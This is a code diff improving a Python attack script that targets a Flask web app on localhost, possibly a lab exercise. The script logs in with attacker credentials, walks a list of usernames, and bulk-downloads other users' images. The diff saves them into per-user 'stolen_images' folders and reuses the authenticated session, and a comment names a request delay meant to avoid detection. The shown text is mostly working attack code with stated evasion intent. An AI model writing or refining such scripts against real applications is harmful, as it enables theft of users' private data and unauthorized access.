@@ -10,11 +10,11 @@ base_url = "http://127.0.0.1:5000"  # Base URL of the Flask app
 login_url = f"{base_url}/login"
 home_url = f"{base_url}/"
 
-output_folder = "stolen_images"
-os.makedirs(output_folder, exist_ok=True)
-
 root_dir = os.path.dirname(os.path.abspath(__file__))
 username_file = os.path.join(root_dir, "names.txt")
+
+output_folder = os.path.join(root_dir, "stolen_images")
+os.makedirs(output_folder, exist_ok=True)
 
 # Attacker's valid login credentials 
 attacker_creds = {
@@ -71,13 +71,16 @@ with open(username_file, "r", encoding="utf-8", errors="ignore") as f:
                             try: # If username exists redo process for entire set
 
                                 time.sleep(0.1)  # 100ms delay between requests to avoid being detected
-                                image = requests.get(url)
+                                image = session.get(url)
 
                                 if image.status_code == 200:
                                     
                                     print(filename)
 
-                                    local_filename = os.path.join(output_folder, f"stolen_{user}_{filename}")
+                                    user_folder = os.path.join(output_folder, user)
+                                    os.makedirs(user_folder, exist_ok=True)
+
+                                    local_filename = os.path.join(user_folder, f"stolen_{filename}")
 
                                     with open(local_filename, "wb") as f:
                                         f.write(image.content)
